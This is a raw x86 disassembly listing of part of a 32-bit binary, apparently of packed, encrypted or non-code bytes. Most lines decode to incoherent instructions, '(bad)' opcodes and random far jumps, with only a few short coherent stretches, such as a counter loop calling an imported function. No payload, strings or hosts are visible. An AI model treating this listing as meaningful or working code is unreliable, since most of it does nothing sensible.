  40f683:	adc    bl,BYTE PTR [eax-0x1dbe6ecf]
  40f689:	pop    ebp
  40f68a:	jmp    DWORD PTR [edi-0x7189d9d7]
  40f690:	cli    
  40f691:	outs   dx,BYTE PTR ds:[esi]
  40f692:	mov    cl,0xaa
  40f694:	lea    ebx,fs:[ebx]
  40f697:	mov    eax,0x1e80182e
  40f69c:	jae    0x40f699
  40f69e:	test   ebx,eax
  40f6a0:	jnp    0x40f698
  40f6a2:	std    
  40f6a3:	stos   DWORD PTR es:[edi],eax
  40f6a4:	out    0x37,eax
  40f6a6:	hlt    
  40f6a7:	and    al,0xab
  40f6a9:	fcomp  st(1)
  40f6ab:	(bad)  
  40f6ac:	cmp    BYTE PTR [edx+0x10],ah
  40f6af:	sub    eax,0x1af71cdd
  40f6b4:	sbb    ebx,ebp
  40f6b6:	in     al,0xe0
  40f6b8:	int3   
  40f6b9:	inc    edx
  40f6ba:	and    eax,0xdae6f88f
  40f6bf:	sub    eax,0x289b0dc6
  40f6c4:	sbb    dl,BYTE PTR [ecx]
  40f6c6:	jl     0x40f66e
  40f6c8:	(bad)  
  40f6c9:	repnz pop ebx
  40f6cb:	or     al,cl
  40f6cd:	pop    eax
  40f6ce:	fisttp WORD PTR [ebp+0x45]
  40f6d1:	adc    eax,0x53132714
  40f6d6:	call   0x9fbd:0x7606802
  40f6dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6de:	mov    ecx,0x9ff55bcf
  40f6e3:	pop    ebp
  40f6e4:	fldcw  WORD PTR [ebx+0x76]
  40f6e7:	xor    dl,ch
  40f6e9:	xor    eax,0xd5d2d70d
  40f6ee:	imul   eax,ebp,0x7e
  40f6f1:	mov    ds,esp
  40f6f3:	rol    dl,cl
  40f6f5:	jp     0x40f741
  40f6f7:	mov    ds:0x387dd24,al
  40f6fc:	imul   eax,DWORD PTR [eax-0x3c],0xffffff96
  40f700:	mov    dl,0xad
  40f702:	popa   
  40f703:	xchg   ecx,eax
  40f704:	in     al,0xe2
  40f706:	ss push eax
  40f708:	enter  0xf4cd,0xf6
  40f70c:	xchg   DWORD PTR [edi-0x6445ae8f],ebp
  40f712:	mov    ecx,0xee3d1bdf
  40f717:	ret    0xf927
  40f71a:	inc    esp
  40f71b:	ror    BYTE PTR [esi],0x29
  40f71e:	or     BYTE PTR [esi],ah
  40f720:	ret    
  40f721:	jae    0x40f6b9
  40f723:	int3   
  40f724:	sub    edi,DWORD PTR [esi+0x3b]
  40f727:	(bad)  
  40f728:	(bad)  
  40f729:	lods   eax,DWORD PTR ds:[esi]
  40f72a:	inc    cl
  40f72c:	out    dx,al
  40f72d:	mov    esp,0x15e7c3ed
  40f732:	mov    dh,0x2c
  40f734:	es and eax,0x732e9d14
  40f73a:	enter  0xced1,0x42
  40f73e:	inc    ebx
  40f73f:	cli    
  40f740:	mov    al,ds:0xd320d729
  40f745:	adc    bl,0xd1
  40f748:	je     0x40f6ef
  40f74a:	adc    DWORD PTR [esi],esp
  40f74c:	adc    DWORD PTR [ecx],edi
  40f74e:	imul   edi,DWORD PTR [esi],0x2
  40f751:	pop    DWORD PTR [eax+0x7dba9630]
  40f757:	ins    BYTE PTR es:[edi],dx
  40f758:	jge    0x40f757
  40f75a:	out    dx,al
  40f75b:	mov    eax,DWORD PTR [eax+edx*2]
  40f75e:	popa   
  40f75f:	push   ebp
  40f760:	xchg   edi,eax
  40f761:	lods   eax,DWORD PTR ds:[esi]
  40f762:	add    BYTE PTR [edi-0x64],cl
  40f765:	popa   
  40f766:	test   DWORD PTR [eax+0xf627634],ecx
  40f76c:	repnz sub al,0x2e
  40f76f:	and    DWORD PTR [ebx-0x6a],0x45
  40f773:	fidivr DWORD PTR [edi+0x760bf5eb]
  40f779:	rol    DWORD PTR [ebx-0x3],1
  40f77c:	jmp    0x40f747
  40f77e:	je     0xf0e62344
  40f784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f785:	adc    BYTE PTR [edi+0x6a],0x6f
  40f789:	ror    BYTE PTR [ecx],0xa9
  40f78c:	lds    esi,FWORD PTR [edi]
  40f78e:	sbb    esi,esp
  40f790:	fnstcw WORD PTR [ebx-0x5a8177c2]
  40f796:	jge    0x40f793
  40f798:	inc    edi
  40f799:	sbb    eax,0xc93a74be
  40f79e:	mov    cl,BYTE PTR [ecx+0x48]
  40f7a1:	sar    BYTE PTR [eax+ebp*4-0x26],1
  40f7a5:	pop    ebp
  40f7a6:	ret    
  40f7a7:	and    DWORD PTR [edi+ebx*4-0x4],edi
  40f7ab:	lds    esi,FWORD PTR [edx+0x6b]
  40f7ae:	dec    esp
  40f7af:	sahf   
  40f7b0:	inc    ebp
  40f7b1:	nop
  40f7b2:	mov    dh,0xb4
  40f7b4:	fdiv   DWORD PTR ds:0x82cceade
  40f7ba:	cdq    
  40f7bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7bc:	fmul   DWORD PTR [esi-0x2f]
  40f7bf:	adc    DWORD PTR [edx-0x19],edx
  40f7c2:	jno    0x40f766
  40f7c4:	sbb    DWORD PTR [eax],edi
  40f7c6:	data16 cld 
  40f7c8:	xor    eax,0xfb31417b
  40f7cd:	in     al,dx
  40f7ce:	aam    0xfd
  40f7d0:	mov    dl,0x28
  40f7d2:	in     eax,dx
  40f7d3:	mov    ds:0xe03dba6c,eax
  40f7d8:	(bad)  
  40f7d9:	jmp    0x9258:0xaaeb95e
  40f7e0:	jne    0x40f83e
  40f7e2:	xor    bl,dh
  40f7e4:	rcr    al,cl
  40f7e6:	xlat   BYTE PTR ds:[ebx]
  40f7e7:	jecxz  0x40f7ec
  40f7e9:	sar    DWORD PTR [ebx],1
  40f7eb:	cli    
  40f7ec:	mov    DWORD PTR ds:0x42a799,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0xf7a35c5f,ch
  40f80a:	and    DWORD PTR [eax],0xe5787847
  40f810:	jle    0x40f88a
  40f812:	js     0x40f7fc
  40f814:	inc    edx
  40f815:	gs or  al,0x51
  40f818:	ret    
  40f819:	xchg   ecx,eax
  40f81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f81b:	imul   ebp,DWORD PTR [ecx-0x425584c6],0xffffffe8
  40f822:	mov    al,dl
  40f824:	fidiv  DWORD PTR [ecx-0x5d]
  40f827:	pop    ebx
  40f828:	mov    bh,0x7d
  40f82a:	out    dx,eax
  40f82b:	lds    edi,FWORD PTR [ecx]
  40f82d:	inc    edx
  40f82e:	out    dx,eax
  40f82f:	sub    ch,BYTE PTR [ebx+0x28d5abee]
  40f835:	ret    
  40f836:	inc    ebx
  40f837:	in     eax,0x78
  40f839:	cmp    ebx,DWORD PTR [ebp+edx*2-0x46]
  40f83d:	sahf   
  40f83e:	out    dx,eax
  40f83f:	ins    DWORD PTR es:[edi],dx
  40f840:	cdq    
  40f841:	mov    dl,0xbf
  40f843:	mov    ebx,0x57ff959
  40f848:	lds    ebx,FWORD PTR [edx+0x3742767c]
  40f84e:	mov    esp,0xacbc1cfb
  40f853:	mov    edx,0x1afc8a2
  40f858:	stos   DWORD PTR es:[edi],eax
  40f859:	lock mov bl,0xe8
  40f85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f85d:	cmc    
  40f85e:	dec    ebp
  40f85f:	xchg   DWORD PTR [esi],esp
  40f861:	and    BYTE PTR [edx],dl
  40f863:	bound  eax,QWORD PTR [edi+edi*2-0x2d40c664]
  40f86a:	iret   
  40f86b:	stc    
  40f86c:	mov    edi,DWORD PTR [ebx+0x7b]
  40f86f:	out    dx,al
  40f870:	sbb    al,0x44
  40f872:	gs cmc 
  40f874:	loope  0x40f8aa
  40f876:	pop    esi
  40f877:	push   cs
  40f878:	sub    al,0xcb
  40f87a:	shr    BYTE PTR [ecx],1
  40f87c:	fucomip st,st(1)
  40f87e:	push   esi
  40f87f:	sbb    eax,0x911422a7
  40f884:	jecxz  0x40f825
  40f886:	fldenv ds:0xd3126d0a
  40f88c:	sub    esp,DWORD PTR [edi]
  40f88e:	sbb    ecx,DWORD PTR [ecx]
  40f890:	inc    edi
  40f891:	inc    ecx
  40f892:	retf   0x893e
  40f895:	iret   
  40f896:	adc    eax,0x6b9aebeb
  40f89b:	mov    al,0x2a
  40f89d:	(bad)  
  40f89e:	adc    BYTE PTR [edx],dl
  40f8a0:	or     al,0x7b
  40f8a2:	jmp    0x40f82e
  40f8a4:	mov    edi,0x34183bf7
  40f8a9:	xchg   edx,eax
  40f8aa:	xor    BYTE PTR [esi-0x118a5969],ah
  40f8b0:	mov    DWORD PTR [esi],0xb5ffc644
  40f8b6:	add    DWORD PTR [ecx-0x40570e8],eax
  40f8bc:	cmp    eax,0x7fdd8c82
  40f8c1:	fnstsw WORD PTR [ebx-0x2b]
  40f8c4:	mov    esi,DWORD PTR [esi+eiz*8]
  40f8c7:	xchg   edi,eax
  40f8c8:	adc    DWORD PTR [esi+0x94a4a26],0x6695918b
  40f8d2:	xor    edx,DWORD PTR [edi-0x75]
  40f8d5:	retf   
  40f8d6:	jb     0x40f8e0
  40f8d8:	sbb    eax,0x9262db65
  40f8dd:	fld    TBYTE PTR [edx-0x6807cc08]
  40f8e3:	mov    ah,0x13
  40f8e5:	cmp    eax,0x62edb8bb
  40f8ea:	loop   0x40f969
  40f8ec:	outs   dx,DWORD PTR ds:[esi]
  40f8ed:	cmp    bl,BYTE PTR [edi-0x5e]
  40f8f0:	popa   
  40f8f1:	push   edi
  40f8f2:	push   edx
  40f8f3:	xor    BYTE PTR [esi+0x2f087752],bh
  40f8f9:	dec    esp
  40f8fa:	popf   
  40f8fb:	div    DWORD PTR [edi+0x1878eeef]
  40f901:	fnstsw WORD PTR [edi-0x63ac62d2]
  40f907:	jmp    0xa1eb:0x558ec45c
  40f90e:	pop    ebx
  40f90f:	test   BYTE PTR [ecx-0x13],bh
  40f912:	dec    ebp
  40f913:	out    0x9b,eax
  40f915:	mov    ebx,0x1bedd27a
  40f91a:	aas    
  40f91b:	lds    esi,FWORD PTR [esi]
  40f91d:	pop    eax
  40f91e:	sub    eax,0x40077bbd
  40f923:	xor    eax,0xc39d541e
  40f928:	xor    ebx,ebx
  40f92a:	popa   
  40f92b:	add    DWORD PTR [esi+0x2],ebx
  40f92e:	jmp    0x40f926
  40f930:	ja     0x40f930
  40f932:	stos   DWORD PTR es:[edi],eax
  40f933:	in     al,0xc0
  40f935:	mov    dl,BYTE PTR [ecx]
  40f937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f938:	inc    eax
  40f939:	add    ah,dh
  40f93b:	sub    dh,bh
  40f93d:	sbb    bh,BYTE PTR [ecx+0x2d]
  40f940:	imul   edx,ebx,0x262fcbcd
  40f946:	mov    ebp,0x24dec50e
  40f94b:	jecxz  0x40f9c6
  40f94d:	mov    BYTE PTR [edi+0x5882aee9],ch
  40f953:	pop    DWORD PTR [ebx]
  40f955:	or     al,BYTE PTR [esi]
  40f957:	cmp    al,0x49
  40f959:	and    BYTE PTR ds:0x4c2c4c62,dh
  40f95f:	(bad)  
  40f960:	js     0x40f9a7
  40f962:	push   cs
  40f963:	jmp    0x289d:0x96145d41
  40f96a:	aam    0x6c
  40f96c:	xchg   ecx,eax
  40f96d:	pop    edx
  40f96e:	mov    BYTE PTR [edi-0x71c504ab],0x15
  40f975:	sbb    al,0xbc
  40f977:	mov    eax,0xe1e5ec3f
  40f97c:	xor    al,0xa
  40f97e:	inc    edi
  40f97f:	jge    0x40f991
  40f981:	dec    edx
  40f982:	retf   0xa4a5
  40f985:	and    esp,ebx
  40f987:	push   edx
  40f988:	cmp    cl,BYTE PTR ds:0xb567acd3
  40f98e:	or     ebx,DWORD PTR [edx+0x7f]
  40f991:	in     al,dx
  40f992:	fsub   QWORD PTR [edi+0x25749af8]
  40f998:	jb     0x40f94d
  40f99a:	mov    edx,0xfdeaf50a
  40f99f:	sub    ecx,esp
  40f9a1:	sbb    ebp,DWORD PTR [eax]
  40f9a3:	pop    ebp
  40f9a4:	fs sbb eax,ebp
  40f9a7:	cmp    BYTE PTR [edx-0x59],ah
  40f9aa:	jmp    0x40f9fe
  40f9ac:	jmp    0xc6a58533
  40f9b1:	fcomp  st(7)
  40f9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9b4:	pop    eax
  40f9b5:	jp     0x40fa19
  40f9b7:	adc    bh,BYTE PTR [ecx]
  40f9b9:	(bad)  
  40f9bb:	pop    ds
  40f9bc:	js     0x40f947
  40f9be:	cmc    
  40f9bf:	cli    
  40f9c0:	mov    gs,esi
  40f9c2:	aaa    
  40f9c3:	jmp    0xbbf11ca7
  40f9c8:	jge    0x40f950
  40f9ca:	sbb    BYTE PTR [edx],0x82
  40f9cd:	xor    ebx,0xffffffdb
  40f9d0:	inc    ebp
  40f9d1:	sbb    BYTE PTR [esi+0x2a],al
  40f9d4:	cmc    
  40f9d5:	push   edx
  40f9d6:	ins    DWORD PTR es:[edi],dx
  40f9d7:	mov    al,0x6b
  40f9d9:	pop    ecx
  40f9da:	es fwait
  40f9dc:	xor    BYTE PTR ds:[eax+ebx*2+0x12],al
  40f9e1:	bound  esp,QWORD PTR [eax+0x350f08d1]
  40f9e7:	nop
  40f9e8:	shr    DWORD PTR [eax-0x138a09a],0xb1
  40f9ef:	adc    cl,BYTE PTR [ebx]
  40f9f1:	jle    0x40fa21
  40f9f3:	mov    eax,0x88f088a2
  40f9f8:	lahf   
  40f9f9:	push   ecx
  40f9fa:	inc    esi
  40f9fb:	scas   al,BYTE PTR es:[edi]
  40f9fc:	jae    0x40f9a5
  40f9fe:	div    DWORD PTR [ebp+ecx*4-0x644d78f8]
  40fa05:	mov    ch,0x48
  40fa07:	mov    bl,0xf1
  40fa09:	sub    bh,cl
  40fa0b:	out    0x71,eax
  40fa0d:	mov    ebp,0x54263009
  40fa12:	in     eax,0x21
  40fa14:	pop    esi
  40fa15:	and    al,0x88
  40fa17:	cmp    esi,ebx
  40fa19:	shr    DWORD PTR ss:[esi],cl
  40fa1c:	sub    edx,DWORD PTR [ecx-0x48cf61e3]
  40fa22:	inc    eax
  40fa23:	inc    edi
  40fa24:	xchg   esi,eax
  40fa25:	fs repnz adc esp,ebx
  40fa29:	push   0x2a
  40fa2b:	dec    ecx
  40fa2c:	cmp    al,0x35
  40fa2e:	repz bound eax,QWORD PTR [edi+0x51]
  40fa32:	sti    
  40fa33:	xor    al,0x51
  40fa35:	dec    ecx
  40fa36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa37:	pop    es
  40fa38:	bound  ebp,QWORD PTR [ecx]
  40fa3a:	rcr    BYTE PTR [esi-0xccf9c81],cl
  40fa40:	and    ebx,DWORD PTR [esi+0x33f5eb9]
  40fa46:	mov    ds:0xd5d57807,eax
  40fa4b:	mov    esi,0x3b6e25a1
  40fa50:	push   eax
  40fa52:	and    BYTE PTR [edx+eax*8+0x35],bh
  40fa56:	jne    0x40fab1
  40fa58:	lock outs dx,DWORD PTR ds:[esi]
  40fa5a:	xchg   edi,eax
  40fa5b:	adc    BYTE PTR [ecx-0x5b],cl
  40fa5e:	fisub  WORD PTR [ebx]
  40fa60:	jae    0x40fa83
  40fa62:	mov    bh,0xe5
  40fa64:	imul   ebx,ebp,0x8826881f
  40fa6a:	(bad)  
  40fa6b:	repz push 0xe01ae4a5
  40fa71:	add    edx,esi
  40fa73:	ds pop esp
  40fa75:	xchg   edi,eax
  40fa76:	inc    edi
  40fa77:	sub    DWORD PTR [ebx],ebp
  40fa79:	or     BYTE PTR [edi+0xf6e5d0c],al
  40fa7f:	test   BYTE PTR [ebx+0x53000053],ch
  40fa85:	mov    DWORD PTR ds:0x42a829,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7e1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7e1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7e1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7e1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7e1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7e1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7e1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7e1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb19
  40fb0f:	call   0x45ce3d47
  40fb14:	js     0x40fb8e
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	or     eax,0x9afd3eec
  40fb1f:	mov    bh,dh
  40fb21:	aam    0x84
  40fb23:	push   edx
  40fb24:	cmp    ebp,eax
  40fb26:	fsub   QWORD PTR [edx-0x525edcff]
  40fb2c:	fsubp  st(1),st
  40fb2e:	jnp    0x40fbac
  40fb30:	sub    ebp,DWORD PTR [eax-0x517dd010]
  40fb36:	or     eax,0xf9468b25
  40fb3b:	mov    ebp,DWORD PTR [ecx]
  40fb3d:	inc    edx
  40fb3e:	jp     0x40fb81
  40fb40:	loopne 0x40fb0a
  40fb42:	cmp    DWORD PTR [edx+0x3],edi
  40fb45:	loope  0x40fae1
  40fb47:	call   0x7a81f96a
  40fb4c:	or     eax,0x79d2fca1
  40fb51:	add    esp,0x60a9c6e2
  40fb57:	sub    BYTE PTR [ecx],al
  40fb59:	call   0x6735:0xedd1628d
  40fb60:	inc    edi
  40fb61:	psubsb mm4,QWORD PTR [edx]
  40fb64:	lods   eax,DWORD PTR ds:[esi]
  40fb65:	or     DWORD PTR [ebp-0x24],0xce0066ce
  40fb6c:	jnp    0x40fb4f
  40fb6e:	les    ecx,FWORD PTR [ecx-0x61]
  40fb71:	sbb    al,BYTE PTR [ebp-0x7ec48979]
  40fb77:	(bad)  
  40fb78:	push   ecx
  40fb79:	and    ebx,DWORD PTR [eax+0x27994fe]
  40fb7f:	idiv   al
  40fb81:	imul   esp,DWORD PTR [edi],0xde22db2
  40fb87:	jecxz  0x40fc01
  40fb89:	bound  ecx,QWORD PTR [ecx-0x703a06c5]
  40fb8f:	in     al,0x13
  40fb91:	in     eax,dx
  40fb92:	and    eax,0x9cd414c5
  40fb97:	(bad)  
  40fb98:	jno    0x40fb7d
  40fb9a:	cmp    BYTE PTR [eax-0x47631794],al
  40fba0:	stos   BYTE PTR es:[edi],al
  40fba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fba2:	or     esi,edx
  40fba4:	jmp    0x548d:0x18b9aa68
  40fbab:	in     eax,0xf0
  40fbad:	cmp    DWORD PTR [edi],0xf5ff3570
  40fbb3:	fdiv   QWORD PTR [esp+eax*8-0x1d]
  40fbb7:	sbb    esp,DWORD PTR [ecx]
  40fbb9:	inc    esi
  40fbba:	aaa    
  40fbbb:	push   0x54
  40fbbd:	stos   DWORD PTR es:[edi],eax
  40fbbe:	out    0x5e,al
  40fbc0:	cmp    BYTE PTR [ebp+0x61cab8cc],ch
  40fbc6:	call   0xff7a:0xc673cefd
  40fbcd:	sbb    ah,BYTE PTR [ebx+eax*8]
  40fbd0:	jl     0x40fb61
  40fbd2:	mov    esp,0x90c7a483
  40fbd7:	xchg   edi,eax
  40fbd8:	mov    edx,0x6c13a013
  40fbdd:	push   esi
  40fbde:	add    ah,BYTE PTR ds:0xe5c99730
  40fbe4:	aam    0xed
  40fbe6:	cmp    al,0x9a
  40fbe8:	popa   
  40fbe9:	cmc    
  40fbea:	xchg   esp,eax
  40fbeb:	mov    edi,0xa652ca3e
  40fbf0:	cmp    eax,0x1ec39bee
  40fbf5:	mov    BYTE PTR [esi-0x17],ch
  40fbf8:	outs   dx,BYTE PTR ds:[esi]
  40fbf9:	mov    al,ds:0x28f969f3
  40fbfe:	ja     0x40fc28
  40fc00:	adc    BYTE PTR [ecx+0x797d183],cl
  40fc06:	push   ss
  40fc07:	leave  
  40fc08:	cmp    BYTE PTR [ebx+0x515e9349],ah
  40fc0e:	mov    bl,0x91
  40fc10:	push   es
  40fc11:	repnz dec ebp
  40fc13:	adc    BYTE PTR [ecx-0x7742d4c],0xca
  40fc1a:	xchg   edi,eax
  40fc1b:	and    al,0x47
  40fc1d:	adc    al,0xf7
  40fc1f:	iret   
  40fc20:	mov    dh,0x7a
  40fc22:	not    DWORD PTR [ebp-0x33e16fa2]
  40fc28:	ja     0x40fc35
  40fc2a:	das    
  40fc2b:	shl    ebx,1
  40fc2d:	lock es push es
  40fc30:	adc    ebp,ebx
  40fc32:	mov    ds:0xaaf438,al
  40fc37:	ins    BYTE PTR es:[edi],dx
  40fc38:	sti    
  40fc39:	icebp  
  40fc3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc3b:	push   ss
  40fc3c:	pop    es
  40fc3d:	shr    BYTE PTR [esi-0x3c],cl
  40fc40:	enter  0xfad8,0x22
  40fc44:	xchg   DWORD PTR [ecx-0x5b3c8723],esp
  40fc4a:	enter  0x61e4,0x2e
  40fc4e:	sbb    bl,0xa1
  40fc51:	les    esp,FWORD PTR [edx+0x4e655556]
  40fc57:	xor    DWORD PTR [eax+edi*8-0x33304f55],edi
  40fc5e:	addr16 aas 
  40fc60:	jge    0x40fc9c
  40fc62:	stc    
  40fc63:	pop    edi
  40fc64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc65:	adc    al,0x54
  40fc67:	dec    ebx
  40fc68:	pop    ebp
  40fc69:	mov    eax,ds:0x7561f046
  40fc6e:	dec    ecx
  40fc6f:	push   esp
  40fc70:	arpl   WORD PTR [ecx-0x77],cx
  40fc73:	rcl    DWORD PTR [eax+0x4e3c90f7],0xf4
  40fc7a:	inc    esp
  40fc7b:	aas    
  40fc7c:	mov    esi,0x772d4066
  40fc81:	jae    0x40fc6b
  40fc83:	xor    ecx,DWORD PTR [esi+0x23154c0b]
  40fc89:	js     0x40fc92
  40fc8b:	jbe    0x40fd0b
  40fc8d:	xor    edx,DWORD PTR [edi-0x708a002a]
  40fc93:	rcl    DWORD PTR [eax-0x12],1
  40fc96:	sahf   
  40fc97:	data16 into 
  40fc99:	lea    ebp,[edx]
  40fc9b:	push   0xaf67c0a0
  40fca0:	xchg   esp,eax
  40fca1:	mov    BYTE PTR [edx],cl
  40fca3:	xor    ebx,esi
  40fca5:	fidivr WORD PTR [ecx]
  40fca7:	fdivr  st(0),st
  40fca9:	push   edx
  40fcaa:	iret   
  40fcab:	punpckhbw mm3,QWORD PTR [ecx+0x50]
  40fcaf:	les    esp,FWORD PTR [ebp+0x10960b6a]
  40fcb5:	ins    BYTE PTR es:[edi],dx
  40fcb6:	add    bl,BYTE PTR [esi-0x7591fe44]
  40fcbc:	inc    ebx
  40fcbd:	jmp    0x41da:0xd8ee3ce2
  40fcc4:	leave  
  40fcc5:	adc    DWORD PTR [esi],edx
  40fcc7:	cmp    edi,ecx
  40fcc9:	stos   BYTE PTR es:[edi],al
  40fcca:	(bad)  
  40fccc:	repnz retf 
  40fcce:	outs   dx,DWORD PTR ds:[esi]
  40fccf:	js     0x40fce1
  40fcd1:	sub    BYTE PTR [ecx],0x81
  40fcd4:	clc    
  40fcd5:	lock pop ss
  40fcd7:	pop    edx
  40fcd8:	add    ch,BYTE PTR [edx-0x5a]
  40fcdb:	mov    al,0x1b
  40fcdd:	dec    edx
  40fcde:	int    0xfe
  40fce0:	xlat   BYTE PTR ds:[ebx]
  40fce1:	xor    eax,DWORD PTR [eax-0x1a4cecbd]
  40fce7:	pop    esi
  40fce8:	cwde   
  40fce9:	sub    eax,DWORD PTR [eax-0x78]
  40fcec:	aad    0x86
  40fcee:	(bad)  
  40fcef:	arpl   WORD PTR [ebx+0x28],si
  40fcf2:	repz jg 0x40fd5f
  40fcf5:	stos   BYTE PTR es:[edi],al
  40fcf6:	inc    esi
  40fcf7:	push   esi
  40fcf8:	push   es
  40fcf9:	retf   
  40fcfa:	mov    ch,0x6f
  40fcfc:	adc    edx,0x7
  40fcff:	and    BYTE PTR [esp+eax*8+0x73],cl
  40fd03:	loopne 0x40fd76
  40fd05:	jmp    0xae43:0x31374cb1
  40fd0c:	pop    edi
  40fd0d:	test   ah,ah
  40fd0f:	jmp    0xb1ec:0xb1557a8a
  40fd16:	adc    esi,DWORD PTR [eax]
  40fd18:	dec    edx
  40fd19:	nop
  40fd1a:	cld    
  40fd1b:	call   0x3295:0x355781e9
  40fd22:	mov    ecx,0x4d6dda90
  40fd27:	std    
  40fd28:	rol    DWORD PTR [edx+0x30],cl
  40fd2b:	dec    ecx
  40fd2c:	scas   al,BYTE PTR es:[edi]
  40fd2d:	popf   
  40fd2e:	(bad)  
  40fd2f:	in     eax,0xe7
  40fd31:	lea    ebp,[eax-0x21]
  40fd34:	fisubr WORD PTR [edi-0x2cacbdfe]
  40fd3a:	ret    0x403a
  40fd3d:	ds cmc 
  40fd3f:	rcr    DWORD PTR [edx-0x1d872723],1
  40fd45:	retf   
  40fd46:	xor    ebx,edx
  40fd48:	cmp    al,0x18
  40fd4a:	call   0x65bd4c94
  40fd4f:	mov    eax,DWORD PTR [ebp-0x11]
  40fd52:	je     0x40fd12
  40fd54:	fld    TBYTE PTR [esi-0x79]
  40fd57:	push   0xfffffff4
  40fd59:	cld    
  40fd5a:	xchg   ebp,eax
  40fd5b:	xor    eax,0x7a8152e6
  40fd60:	test   eax,0x49790596
  40fd65:	jns    0x40fd67
  40fd67:	jmp    0x40fd1e
  40fd69:	xchg   ebx,eax
  40fd6a:	jb     0x40fd80
  40fd6c:	push   0x47f62d00
  40fd71:	imul   edx,DWORD PTR [edi+0x53],0xffffffcd
  40fd75:	mov    cl,0xf7
  40fd77:	xlat   BYTE PTR ds:[ebx]
  40fd78:	out    0x43,al
  40fd7a:	or     dl,BYTE PTR [esi-0x49]
  40fd7d:	xor    al,0xcf
  40fd7f:	or     DWORD PTR [esi+0x35692a4b],edi
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	mov    esp,0x7afb38bf
  40fdc0:	dec    ebx
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	mov    cs,WORD PTR [esi-0x5b]
  40fdca:	mov    eax,ds:0x8df3abf8
  40fdcf:	jmp    0x40fd80
  40fdd1:	and    eax,0x8b5bcac6
  40fdd6:	mov    cl,0x7b
  40fdd8:	or     dh,dh
  40fdda:	mov    ds:0xa72cd2b,eax
  40fddf:	push   cs
  40fde0:	sbb    dh,BYTE PTR [edi+ebx*4]
  40fde3:	pushf  
  40fde4:	aas    
  40fde5:	sub    eax,0x755b65ff
  40fdea:	mov    esi,0x41e32752
  40fdef:	int    0xc2
  40fdf1:	stc    
  40fdf2:	lock sub DWORD PTR [ecx+0x72],ebp
  40fdf6:	imul   edi,esi,0x5e
  40fdf9:	push   cs
  40fdfa:	add    eax,0x8cafa37e
  40fdff:	or     eax,0x1c615c46
  40fe04:	cwde   
  40fe05:	mov    DWORD PTR [edi+0x5f],ebx
  40fe08:	lahf   
  40fe09:	(bad)  
  40fe0a:	xor    eax,0x8a0277c2
  40fe0f:	and    al,0x7a
  40fe11:	mov    dl,0x9e
  40fe13:	es and eax,0x849b96d7
  40fe19:	push   cs
  40fe1a:	rcr    BYTE PTR [esi+0x12],cl
  40fe1d:	aam    0x45
  40fe1f:	and    DWORD PTR [ebp+0x2acad6af],edx
  40fe25:	jae    0x40fe27
  40fe27:	sub    eax,0x30041424
  40fe2c:	out    0xd,al
  40fe2e:	fild   DWORD PTR [edi-0x3224f68d]
  40fe34:	retf   0x9fc2
  40fe37:	(bad)  
  40fe38:	fnstsw WORD PTR [ecx-0x2db90865]
  40fe3e:	push   edx
  40fe3f:	ror    DWORD PTR [ebx-0x79b22da7],1
  40fe45:	lock pushf 
  40fe47:	out    dx,eax
  40fe48:	jno    0x40febd
  40fe4a:	leave  
  40fe4b:	scas   al,BYTE PTR es:[edi]
  40fe4c:	and    DWORD PTR [esi+0x46],esp
  40fe4f:	leave  
  40fe50:	xchg   DWORD PTR [eax],edi
  40fe52:	mov    ebp,esi
  40fe54:	add    al,0x3a
  40fe56:	test   eax,0x5f7d3469
  40fe5b:	jmp    0x2ea7:0x3880590c
  40fe62:	or     edx,DWORD PTR [eax-0x50]
